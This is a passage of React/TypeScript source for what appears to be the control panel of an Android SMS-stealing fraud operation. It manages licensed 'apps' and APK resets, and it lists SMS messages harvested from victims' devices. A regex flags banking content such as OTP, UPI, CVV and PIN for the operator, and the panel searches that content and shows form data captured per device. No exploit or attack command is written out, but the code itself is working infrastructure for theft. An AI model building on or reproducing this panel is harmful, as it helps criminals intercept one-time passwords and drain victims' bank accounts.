        <div style={{ marginBottom: 14 }}><FieldLabel>App Name</FieldLabel><input type="text" value={name} onChange={e => setName(e.target.value)} style={inpBase} /></div>
        <div style={{ marginBottom: 14 }}><FieldLabel>Login PIN</FieldLabel><input type="text" value={pin} onChange={e => setPin(e.target.value)} style={{ ...inpBase, fontFamily: "monospace" }} /></div>
        {err && <ErrBanner msg={err} />}
        <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
          <button type="button" onClick={onClose} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: T.border, border: `1px solid ${T.borderLight}`, color: T.text, fontWeight: 700, cursor: "pointer", fontSize: 13 }}>Cancel</button>
          <button type="submit" disabled={loading} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 700, cursor: loading ? "default" : "pointer", fontSize: 13 }}>{loading ? "Saving…" : "Save Changes"}</button>
        </div>
      </form>
    </Modal>
  );
}

/* ── Renew Modal ── */
function RenewModal({ app, masterPin, onClose, onRenewed }: { app: App; masterPin: string; onClose: () => void; onRenewed: (a: App) => void }) {
  const [loading, setLoading] = useState(false); const [err, setErr] = useState("");
  const THIRTY_MS = 30 * 24 * 60 * 60 * 1000;
  const oldExpiry = new Date(app.createdAt).getTime() + THIRTY_MS;
  const isExpired = oldExpiry < Date.now();
  const newExpiry = new Date(isExpired ? Date.now() + THIRTY_MS : oldExpiry + THIRTY_MS);
  const newExpiryStr = newExpiry.toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" });
  async function handleRenew() {
    setLoading(true); setErr("");
    try {
      const r = await apiFetch(`/api/master/apps/${encodeURIComponent(app.appId)}/renew`, { method: "POST", headers: { "x-master-pin": masterPin } });
      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Failed"); return; }
      onRenewed(await r.json() as App);
    } catch { setErr("Network error"); } finally { setLoading(false); }
  }
  return (
    <Modal onClose={onClose} maxWidth={380}>
      <ModalHeader title="Renew Licence +30 Days" icon={<Ic.CalendarPlus />} onClose={onClose} />
      <div style={{ background: T.inputBg, borderRadius: 10, padding: "12px 14px", border: `1px solid ${T.green}30`, marginBottom: 14 }}>
        <div style={{ fontSize: 11, color: T.muted, marginBottom: 2 }}>App</div>
        <div style={{ fontWeight: 800, fontSize: 14, color: T.text, marginBottom: 6 }}>{app.name}</div>
        <div style={{ fontFamily: "monospace", fontSize: 11, color: T.accentLight }}>{app.appId}</div>
      </div>
      <div style={{ fontSize: 13, color: T.muted, marginBottom: 14, lineHeight: 1.7 }}>
        {isExpired ? <><span style={{ color: T.red, fontWeight: 700 }}>Licence expired.</span> Fresh <b style={{ color: T.green }}>30-day</b> from today.</> : <>Extended by <b style={{ color: T.green }}>+30 days</b>.</>}<br />
        New expiry: <b style={{ color: T.text }}>{newExpiryStr}</b>
      </div>
      {err && <ErrBanner msg={err} />}
      <div style={{ display: "flex", gap: 10 }}>
        <button onClick={onClose} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: T.border, border: `1px solid ${T.borderLight}`, color: T.text, fontWeight: 700, cursor: "pointer", fontSize: 13 }}>Cancel</button>
        <button onClick={handleRenew} disabled={loading} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: "linear-gradient(135deg,#16a34a,#22c55e)", border: "none", color: "#fff", fontWeight: 800, cursor: loading ? "default" : "pointer", fontSize: 13 }}>{loading ? "Renewing…" : "Confirm +30 Days"}</button>
      </div>
    </Modal>
  );
}

/* ── App Card ── */
function AppCard({ app, onEdit, onDelete, onToggle, onLogoutAll, onCopyUrl, onResetApk, onRenew, copyMsg, deletingId, togglingId, logoutAllId, resetApkId, renewId }: {
  app: App; onEdit: (a: App) => void; onDelete: (a: App) => void;
  onToggle: (a: App) => void; onLogoutAll: (a: App) => void; onCopyUrl: (a: App) => void;
  onResetApk: (a: App) => void; onRenew: (a: App) => void;
  copyMsg: Record<string, string>; deletingId: string | null; togglingId: string | null;
  logoutAllId: string | null; resetApkId: string | null; renewId: string | null;
}) {
  const isActive = app.status === "active";
  const dt = new Date(app.createdAt);
  const dateStr = dt.toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" }) + " · " + dt.toLocaleTimeString("en-IN", { hour: "2-digit", minute: "2-digit", hour12: true });
  return (
    <div style={{ background: T.card, borderRadius: 16, border: `1px solid ${T.borderLight}`, overflow: "hidden", position: "relative", boxShadow: "0 2px 12px rgba(0,0,0,0.18)" }}>
      <div style={{ position: "absolute", left: 0, top: 0, bottom: 0, width: 3, background: isActive ? `linear-gradient(180deg,${T.green},#4ade80)` : `linear-gradient(180deg,${T.red},#f87171)` }} />
      <div style={{ padding: "13px 14px 13px 18px" }}>
        <div style={{ display: "flex", alignItems: "flex-start", gap: 10, marginBottom: 10 }}>
          <div style={{ flex: 1, minWidth: 0 }}>
            <div style={{ fontSize: 15, fontWeight: 800, color: T.text, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{app.name}</div>
            <div style={{ fontSize: 10, color: T.muted, marginTop: 2 }}>{dateStr}</div>
          </div>
          <span style={{ display: "inline-flex", alignItems: "center", gap: 4, fontSize: 10, fontWeight: 700, padding: "3px 9px", borderRadius: 99, color: isActive ? T.green : T.red, background: (isActive ? T.green : T.red) + "18", border: `1px solid ${(isActive ? T.green : T.red)}30` }}>
            <span style={{ width: 5, height: 5, borderRadius: "50%", background: isActive ? T.green : T.red, display: "inline-block" }} />{isActive ? "Active" : "Off"}
          </span>
        </div>
        <div style={{ display: "flex", gap: 8, marginBottom: 11 }}>
          <div style={{ flex: 1, background: T.inputBg, borderRadius: 9, padding: "7px 10px", border: `1px solid ${T.border}`, minWidth: 0 }}>
            <div style={{ fontSize: 9, color: T.muted, fontWeight: 700, letterSpacing: 1, textTransform: "uppercase", marginBottom: 4 }}>App ID</div>
            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
              <span style={{ fontSize: 10, color: T.accentLight, fontFamily: "monospace", fontWeight: 600, flex: 1, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{app.appId}</span>
              <CopyBtn value={app.appId} label="ID" />
            </div>
          </div>
          <div style={{ background: T.inputBg, borderRadius: 9, padding: "7px 10px", border: `1px solid ${T.border}`, flexShrink: 0 }}>
            <div style={{ fontSize: 9, color: T.muted, fontWeight: 700, letterSpacing: 1, textTransform: "uppercase", marginBottom: 4 }}>PIN</div>
            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
              <span style={{ fontSize: 14, color: T.text, fontFamily: "monospace", letterSpacing: 4, fontWeight: 700 }}>{app.pin}</span>
              <CopyBtn value={app.pin} label="PIN" />
            </div>
          </div>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "7px 10px", borderRadius: 9, background: app.deleteProtectionPin ? (app.deleteProtectionEnabled ? "#16a34a18" : "#1a274080") : "#1a274050", border: `1px solid ${app.deleteProtectionPin ? (app.deleteProtectionEnabled ? "#16a34a40" : T.borderLight) : T.border}`, marginBottom: 7 }}>
          <span style={{ fontSize: 10, color: T.muted, fontWeight: 700, letterSpacing: 0.8, textTransform: "uppercase", flexShrink: 0 }}>Del Password</span>
          <span style={{ flex: 1 }} />
          {app.deleteProtectionPin ? (
            <>
              <span style={{ fontFamily: "monospace", fontSize: 13, fontWeight: 700, color: app.deleteProtectionEnabled ? "#4ade80" : T.mutedLight, letterSpacing: 1 }}>{app.deleteProtectionPin}</span>
              <span style={{ fontSize: 10, fontWeight: 700, padding: "2px 7px", borderRadius: 99, background: app.deleteProtectionEnabled ? "#16a34a22" : T.border, color: app.deleteProtectionEnabled ? "#4ade80" : T.muted, border: `1px solid ${app.deleteProtectionEnabled ? "#16a34a44" : "transparent"}` }}>{app.deleteProtectionEnabled ? "ON" : "OFF"}</span>
            </>
          ) : <span style={{ fontSize: 11, color: T.muted, fontStyle: "italic" }}>Not set</span>}
        </div>
        <div style={{ display: "flex", gap: 5, alignItems: "center" }}>
          <button onClick={() => onCopyUrl(app)} title={copyMsg[app.appId] || "Copy URL"} style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", transition: "all 0.15s", outline: "none", border: "1px solid", background: copyMsg[app.appId] ? T.green + "1a" : T.border + "60", borderColor: copyMsg[app.appId] ? T.green + "55" : T.borderLight, color: copyMsg[app.appId] ? T.green : T.mutedLight }}>
            {copyMsg[app.appId] ? <Ic.Check /> : <Ic.Link />}
          </button>
          <button onClick={() => onEdit(app)} title="Edit" style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", transition: "all 0.15s", outline: "none", background: T.border + "60", border: `1px solid ${T.borderLight}`, color: T.mutedLight }}>
            <Ic.Pencil />
          </button>
          <button onClick={() => onLogoutAll(app)} disabled={logoutAllId === app.appId} title="Logout All Sessions" style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", transition: "all 0.15s", outline: "none", background: "#7c3aed14", border: "1px solid #7c3aed40", color: "#a78bfa", opacity: logoutAllId === app.appId ? 0.45 : 1 }}>
            {logoutAllId === app.appId ? <Spinner /> : <Ic.LogOut2 />}
          </button>
          <button onClick={() => onResetApk(app)} disabled={resetApkId === app.appId} title="Reset APK" style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", transition: "all 0.15s", outline: "none", background: "#0369a114", border: "1px solid #0369a140", color: "#38bdf8", opacity: resetApkId === app.appId ? 0.45 : 1, cursor: resetApkId === app.appId ? "wait" : "pointer" }}>
            {resetApkId === app.appId ? <Spinner /> : <Ic.Refresh />}
          </button>
          <button onClick={() => onRenew(app)} disabled={renewId === app.appId} title="Renew Licence +30 Days" style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", transition: "all 0.15s", outline: "none", background: "#16a34a14", border: "1px solid #16a34a40", color: "#4ade80", opacity: renewId === app.appId ? 0.45 : 1, cursor: renewId === app.appId ? "wait" : "pointer" }}>
            <Ic.CalendarPlus />
          </button>
          <div style={{ width: 1, height: 22, background: T.border, flexShrink: 0 }} />
          <button onClick={() => onToggle(app)} disabled={togglingId === app.appId} title={isActive ? "Disable" : "Enable"} style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", transition: "all 0.15s", outline: "none", background: isActive ? T.yellow + "14" : T.green + "14", border: `1.5px solid ${isActive ? T.yellow + "55" : T.green + "55"}`, color: isActive ? T.yellow : T.green, opacity: togglingId === app.appId ? 0.45 : 1, cursor: togglingId === app.appId ? "wait" : "pointer" }}>
            <Ic.Power />
          </button>
          <button onClick={() => onDelete(app)} disabled={deletingId === app.appId} title="Delete App" style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", transition: "all 0.15s", outline: "none", background: T.red + "14", border: `1.5px solid ${T.red}44`, color: T.red, opacity: deletingId === app.appId ? 0.45 : 1, cursor: deletingId === app.appId ? "wait" : "pointer" }}>
            <Ic.Trash />
          </button>
        </div>
      </div>
    </div>
  );
}

/* ── App Selector ── */
function AppSelector({ apps, value, onChange, allLabel = "All Apps" }: { apps: App[]; value: string; onChange: (v: string) => void; allLabel?: string }) {
  return (
    <div style={{ position: "relative", display: "inline-block" }}>
      <select value={value} onChange={e => onChange(e.target.value)} style={{ appearance: "none", WebkitAppearance: "none", background: T.card, border: `1px solid ${T.borderLight}`, color: T.text, borderRadius: 9, padding: "8px 36px 8px 12px", fontSize: 13, fontWeight: 600, outline: "none", cursor: "pointer", fontFamily: "inherit" }}>
        <option value="">{allLabel}</option>
        {apps.map(a => <option key={a.appId} value={a.appId}>{a.name} · {a.appId}</option>)}
      </select>
      <div style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", pointerEvents: "none", color: T.muted }}><Ic.ChevronDown /></div>
    </div>
  );
}

/* ── Message helpers (same logic as sub admin) ── */
function isBankingMsg(body: string, sender: string): boolean {
  const text = (body + " " + sender).toLowerCase();
  return /\b(otp|upi|neft|rtgs|imps|bank|credit|debit|account|balance|transaction|txn|payment|transfer|rupee|inr|atm|cvv|pin|emi|loan|insurance|fraud|wallet|paytm|gpay|phonepe|bhim|recharge|cashback|refund|invoice|bill|due|mandate|auto.?pay|salary|withdraw|deposit)\b|₹/.test(text);
}
function isJunkSender(sender: string | null | undefined): boolean {
  if (!sender) return true;
  const s = sender.trim().toLowerCase();
  return !s || s === "new sms" || s === "unknown" || s === "sms" || s.startsWith("sms from ");
}
function fmtShort(iso: string): string {
  return new Date(iso).toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: false });
}

/* ── MsgCard — identical to sub admin's MsgCard design ── */
function MsgCard({ msg, appColor }: { msg: MsgRow; appColor: string }) {
  const displaySender = isJunkSender(msg.fromSender) ? msg.fromNumber : msg.fromSender;
  const isBank = isBankingMsg(msg.body, msg.fromSender);
  const [copiedBody, setCopiedBody] = useState(false);
  const [copiedSender, setCopiedSender] = useState(false);

  function copyVal(val: string, setCopied: (b: boolean) => void) {
    copyToClipboard(val).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000); });
  }

  return (
    <div style={{
      position: "relative", borderRadius: 8, overflow: "hidden",
      border: `1px solid ${T.borderLight}`,
      contentVisibility: "auto", containIntrinsicSize: "auto 140px",
    } as React.CSSProperties}>
      <div style={{ background: T.card, padding: "10px 14px", transition: "box-shadow 0.15s" }}
        onMouseEnter={e => (e.currentTarget as HTMLDivElement).style.boxShadow = "0 2px 8px rgba(99,102,241,0.13)"}
        onMouseLeave={e => (e.currentTarget as HTMLDivElement).style.boxShadow = "none"}
      >
        {/* Header: time on left | device + appId on right */}
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6, gap: 8 }}>
          <span style={{ fontSize: 10, color: "#94a3b8" }}>{fmtShort(msg.receivedAt)}</span>
          <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
            <span style={{ fontSize: 9, background: appColor + "22", color: appColor, border: `1px solid ${appColor}55`, borderRadius: 4, padding: "1px 6px", fontWeight: 800 }}>{msg.appId}</span>
            <span style={{ fontSize: 10, background: T.headerBg, color: "#64748b", padding: "1px 7px", borderRadius: 4, fontFamily: "monospace" }}>{msg.deviceId.slice(0, 14)}</span>
          </div>
        </div>

        {/* Body */}
        <div style={{ display: "flex", alignItems: "flex-start", gap: 6, marginBottom: 6 }}>
          <div style={{ flex: 1, fontSize: 13, color: isBank ? "#16a34a" : T.text, lineHeight: 1.55, wordBreak: "break-word" }}>{msg.body}</div>
          <button onClick={e => { e.stopPropagation(); copyVal(msg.body, setCopiedBody); }} title="Copy message"
            style={{ flexShrink: 0, background: "none", border: "none", cursor: "pointer", color: copiedBody ? T.green : T.accentLight, padding: 2, marginTop: 1, display: "flex" }}>
            {copiedBody
              ? <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
              : <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
            }
          </button>
        </div>

        {/* From / To row */}
        <div style={{ display: "flex", gap: 12, fontSize: 11, flexWrap: "wrap", alignItems: "center" }}>
          <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
            <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>FROM</span>
            {displaySender}
            <button onClick={e => { e.stopPropagation(); copyVal(displaySender ?? "", setCopiedSender); }} title="Copy sender"
              style={{ background: "none", border: "none", cursor: "pointer", color: copiedSender ? T.green : T.accentLight, padding: 1, display: "flex" }}>
              {copiedSender
                ? <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                : <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
              }
            </button>
          </span>
          {msg.fromSender && !isJunkSender(msg.fromSender) && msg.fromNumber !== msg.fromSender && (
            <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
              <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>NUM</span>
              {msg.fromNumber}
            </span>
          )}
          {msg.isSensitive && <span style={{ fontSize: 9, fontWeight: 800, color: T.red, background: T.red + "18", borderRadius: 4, padding: "1px 5px" }}>SENSITIVE</span>}
        </div>
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════
   MESSAGES TAB
══════════════════════════════════════════ */
function MessagesTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
  const [msgs, setMsgs] = useState<MsgRow[]>([]);
  const [loading, setLoading] = useState(false);
  const [searching, setSearching] = useState(false);
  const [appFilter, setAppFilter] = useState("");
  const [search, setSearch] = useState("");
  const [sensitiveOnly, setSensitiveOnly] = useState(false);
  const [visibleCount, setVisibleCount] = useState(30);
  const sentinelRef = useRef<HTMLDivElement>(null);

  /* Total count in DB (for this appFilter) — fetched once, updated on appFilter change */
  const [totalDbCount, setTotalDbCount] = useState<number | null>(null);
  useEffect(() => {
    setTotalDbCount(null);
    const qs = appFilter ? `?appId=${encodeURIComponent(appFilter)}` : "";
    apiFetch(`/api/messages/count${qs}`, { headers: { "x-master-pin": masterPin } })
      .then(r => r.ok ? r.json() as Promise<{ count: number }> : null)
      .then(d => d && setTotalDbCount(d.count))
      .catch(() => {});
  }, [appFilter, masterPin]);

  /* Debounce search — 400ms so server isn't hammered on each keystroke */
  const [debouncedSearch, setDebouncedSearch] = useState("");
  useEffect(() => {
    const t = setTimeout(() => setDebouncedSearch(search.trim()), 400);
    return () => clearTimeout(t);
  }, [search]);

  /* Browse mode: no search — fetch latest 5000 messages once */
  const fetchBrowse = useCallback(async () => {
    setLoading(true); setVisibleCount(30);
    try {
      const qs = appFilter ? `?appId=${encodeURIComponent(appFilter)}&limit=5000` : "?limit=5000";
      const r = await apiFetch(`/api/messages${qs}`, { headers: { "x-master-pin": masterPin } });
      if (r.ok) setMsgs((await r.json() as MsgRow[]).sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime()));
    } catch { } finally { setLoading(false); }
  }, [appFilter, masterPin]);

  /* Search mode: pass search term to server — searches ALL rows in DB */
  const fetchSearch = useCallback(async (term: string) => {
    setSearching(true); setVisibleCount(30);
    try {
      const params = new URLSearchParams({ search: term });
      if (appFilter) params.set("appId", appFilter);
      const r = await apiFetch(`/api/messages?${params}`, { headers: { "x-master-pin": masterPin } });
      if (r.ok) setMsgs((await r.json() as MsgRow[]).sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime()));
    } catch { } finally { setSearching(false); }
  }, [appFilter, masterPin]);

  /* Trigger correct fetch based on whether search is active */
  useEffect(() => {
    if (debouncedSearch) void fetchSearch(debouncedSearch);
    else void fetchBrowse();
  }, [debouncedSearch, fetchBrowse, fetchSearch]);

  /* Client-side sensitive filter only (text search is now server-side) */
  const filtered = useMemo(() => {
    if (!sensitiveOnly) return msgs;
    return msgs.filter(m => isBankingMsg(m.body, m.fromSender) || m.isSensitive);
  }, [msgs, sensitiveOnly]);

  useEffect(() => { setVisibleCount(30); }, [filtered.length]);

  /* Infinite scroll */
  useEffect(() => {
    const el = sentinelRef.current;
    if (!el) return;
    const obs = new IntersectionObserver(entries => {
      if (entries[0].isIntersecting) setVisibleCount(c => Math.min(c + 30, filtered.length));
    }, { rootMargin: "300px" });
    obs.observe(el);
    return () => obs.disconnect();
  }, [filtered.length]);

  const visible = useMemo(() => filtered.slice(0, visibleCount), [filtered, visibleCount]);
  const isLoading = loading || searching;

  const appColors = useMemo(() => {
    const colors: Record<string, string> = {};
    const palette = ["#6366f1","#8b5cf6","#06b6d4","#f59e0b","#10b981","#ef4444","#f97316","#ec4899"];
    let ci = 0;
    msgs.forEach(m => { if (!colors[m.appId]) colors[m.appId] = palette[ci++ % palette.length]; });
    return colors;
  }, [msgs]);

  return (
    <div style={{ padding: "10px 0", display: "flex", flexDirection: "column", gap: 10 }}>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        <AppSelector apps={apps} value={appFilter} onChange={v => setAppFilter(v)} />
        <div style={{ flex: 1, minWidth: 200, background: T.card, border: `1px solid ${T.borderLight}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
          <span style={{ color: T.muted, fontSize: 13 }}>⌕</span>
          <input value={search} onChange={e => setSearch(e.target.value)}
            placeholder="Search across ALL messages in DB…"
            style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: T.text }} />
          {searching && <Spinner size={12} />}
          {search && !searching && <button onClick={() => setSearch("")} style={{ background: "none", border: "none", cursor: "pointer", color: T.muted, fontSize: 14, padding: 0 }}>✕</button>}
        </div>
        <button onClick={() => setSensitiveOnly(v => !v)} style={{
          padding: "8px 12px", borderRadius: 8, border: "1.5px solid",
          borderColor: sensitiveOnly ? T.red : T.borderLight,
          background: sensitiveOnly ? T.red + "18" : T.card,
          color: sensitiveOnly ? T.red : T.muted,
          fontSize: 11, fontWeight: 600, cursor: "pointer",
        }}>Sensitive</button>
        <button onClick={() => debouncedSearch ? void fetchSearch(debouncedSearch) : void fetchBrowse()} disabled={isLoading} style={{ padding: "8px 12px", borderRadius: 8, border: `1px solid ${T.borderLight}`, background: T.card, color: T.mutedLight, fontSize: 11, fontWeight: 700, cursor: isLoading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 5 }}>
          {isLoading ? <Spinner /> : <Ic.Refresh />} Refresh
        </button>
      </div>

      <div style={{ fontSize: 10, color: "#64748b", display: "flex", alignItems: "center", gap: 8, flexWrap: "wrap" }}>
        {/* Total in DB — always shown */}
        <span style={{ background: T.accentGlow, color: T.accentLight, borderRadius: 99, padding: "2px 9px", fontWeight: 700, fontSize: 10 }}>
          DB Total: {totalDbCount !== null ? totalDbCount.toLocaleString() : "…"}
        </span>
        {debouncedSearch ? (
          <span>
            <span style={{ color: T.accentLight }}>🔍</span>{" "}
            <b style={{ color: T.text }}>{filtered.length.toLocaleString()}</b> results for "{debouncedSearch}"
            {totalDbCount !== null && <span style={{ color: T.muted }}> — searched all {totalDbCount.toLocaleString()} messages</span>}
          </span>
        ) : (
          <span>
            Batch: <b style={{ color: T.text }}>{msgs.length.toLocaleString()}</b>
            {totalDbCount !== null && msgs.length < totalDbCount && (
              <span style={{ color: T.muted }}> of {totalDbCount.toLocaleString()} total</span>
            )}
            {sensitiveOnly && filtered.length !== msgs.length && <span style={{ color: T.red }}> · {filtered.length} sensitive</span>}
          </span>
        )}
        {visibleCount < filtered.length && <span style={{ color: T.muted }}>· showing {visibleCount}</span>}
      </div>

      {isLoading && msgs.length === 0 ? (
        <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 8, padding: 40 }}>
          <Spinner /><span style={{ fontSize: 13, color: "#94a3b8" }}>{debouncedSearch ? "Searching all messages…" : "Loading messages…"}</span>
        </div>
      ) : filtered.length === 0 ? (
        <div style={{ textAlign: "center", color: "#94a3b8", padding: 32, fontSize: 13 }}>
          {search || sensitiveOnly ? "No messages found" : "No messages yet"}
        </div>
      ) : (
        <>
          <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
            {visible.map(msg => (
              <MsgCard key={msg.id} msg={msg} appColor={appColors[msg.appId] ?? T.accent} />
            ))}
          </div>
          <div ref={sentinelRef} style={{ height: 1 }} />
          {visibleCount < filtered.length && (
            <div style={{ display: "flex", justifyContent: "center", padding: "10px 0" }}><Spinner /></div>
          )}
        </>
      )}
    </div>
  );
}

/* ══════════════════════════════════════════
   GROUPS TAB
══════════════════════════════════════════ */
/* ── Helpers for GroupsTab ── */
function timeAgo(iso: string | null | undefined): string {
  if (!iso) return "—";
  const diff = Date.now() - new Date(iso).getTime();
  if (diff < 60000) return "just now";
  if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
  if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
  return `${Math.floor(diff / 86400000)}d ago`;
}
function fmtKey(k: string) { return k.replace(/_/g, " ").replace(/([A-Z])/g, " $1").trim().replace(/^./, c => c.toUpperCase()); }
function CopyIconBtn({ value, title = "Copy" }: { value: string; title?: string }) {
  const [done, setDone] = useState(false);
  function handleCopy(e: React.MouseEvent) {
    e.stopPropagation();
    copyToClipboard(value).then(() => { setDone(true); setTimeout(() => setDone(false), 2000); });
  }
  return (
    <button onClick={handleCopy} title={title} style={{ background: "none", border: "none", cursor: "pointer", color: done ? T.green : T.accentLight, padding: 1, display: "flex", flexShrink: 0 }}>
      {done
        ? <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
        : <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
      }
    </button>
  );
}

function GroupsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
  const [groups, setGroups] = useState<GroupRow[]>([]);
  const [loading, setLoading] = useState(false);
  const [appFilter, setAppFilter] = useState("");
  const [search, setSearch] = useState("");
  const [visibleCount, setVisibleCount] = useState(15);
  const sentinelRef = useRef<HTMLDivElement>(null);

  const fetchGroups = useCallback(async () => {
    setLoading(true);
    try {
      const qs = appFilter ? `?appId=${encodeURIComponent(appFilter)}` : "";
      const r = await apiFetch(`/api/data${qs}`, { headers: { "x-master-pin": masterPin } });
      if (r.ok) setGroups(await r.json() as GroupRow[]);
    } catch { /* ignore */ } finally { setLoading(false); }
  }, [appFilter, masterPin]);

  useEffect(() => { void fetchGroups(); }, [fetchGroups]);
  useEffect(() => { setVisibleCount(15); }, [search, appFilter]);

  /* Group by userId+appId (master admin is cross-app) */
  const grouped = useMemo(() => {
    const q = search.trim().toLowerCase();
    const formByDevice: Record<string, GroupRow[]> = {};
    for (const g of groups) {
      const key = `${g.appId}||${g.deviceId}`;
      if (!formByDevice[key]) formByDevice[key] = [];
      formByDevice[key].push(g);
    }

    /* Build userId groups */
    const byUser: Record<string, { appId: string; deviceId: string; entries: GroupRow[] }[]> = {};
    for (const [key, entries] of Object.entries(formByDevice)) {
      const [appId, deviceId] = key.split("||");
      const userId = entries[0]?.userId ?? deviceId ?? "unknown";
      const uid = `${appId}||${userId}`;
      if (!byUser[uid]) byUser[uid] = [];
      byUser[uid].push({ appId: appId ?? "", deviceId: deviceId ?? "", entries });
    }

    /* Sort each user's devices by newest submission */
    for (const devices of Object.values(byUser)) {
      devices.sort((a, b) => {
        const la = Math.max(...a.entries.map(e => new Date(e.submittedAt).getTime()));
        const lb = Math.max(...b.entries.map(e => new Date(e.submittedAt).getTime()));
        return lb - la;
      });
    }

    /* Sort users by newest submission */
    let userIds = Object.keys(byUser).sort((a, b) => {
      const la = Math.max(...byUser[a].flatMap(d => d.entries.map(e => new Date(e.submittedAt).getTime())));
      const lb = Math.max(...byUser[b].flatMap(d => d.entries.map(e => new Date(e.submittedAt).getTime())));
      return lb - la;
    });

    /* Filter by search */
    if (q) {
      userIds = userIds.filter(uid =>
        uid.toLowerCase().includes(q) ||
        byUser[uid].some(d =>
          d.deviceId.toLowerCase().includes(q) ||
          d.appId.toLowerCase().includes(q) ||
          d.entries.some(e => Object.values(e.data ?? {}).some(v => String(v).toLowerCase().includes(q)))
        )
      );
    }

    return { userIds, byUser };
  }, [groups, search]);

  /* Infinite scroll sentinel */
  const totalUsers = grouped.userIds.length;
  useEffect(() => {
    const el = sentinelRef.current;
    if (!el) return;
    const obs = new IntersectionObserver(entries => {
      if (entries[0].isIntersecting) setVisibleCount(c => Math.min(c + 15, totalUsers));
    }, { rootMargin: "400px" });
    obs.observe(el);
    return () => obs.disconnect();
  }, [totalUsers]);

  const visibleUsers = grouped.userIds.slice(0, visibleCount);
  const totalEntries = groups.length;

  const B = T.borderLight;
  const H = T.headerBg;

  return (
    <div style={{ padding: "10px 0", display: "flex", flexDirection: "column", gap: 8 }}>

      {/* Toolbar */}
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        <AppSelector apps={apps} value={appFilter} onChange={v => setAppFilter(v)} />
        <div style={{ flex: 1, minWidth: 180, background: T.card, border: `1px solid ${B}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
          <span style={{ color: T.muted, fontSize: 13 }}>⌕</span>
          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search by value, device, app…"
            style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: T.text }} />
          {search && <button onClick={() => setSearch("")} style={{ background: "none", border: "none", cursor: "pointer", color: T.muted, fontSize: 14, padding: 0 }}>✕</button>}
        </div>
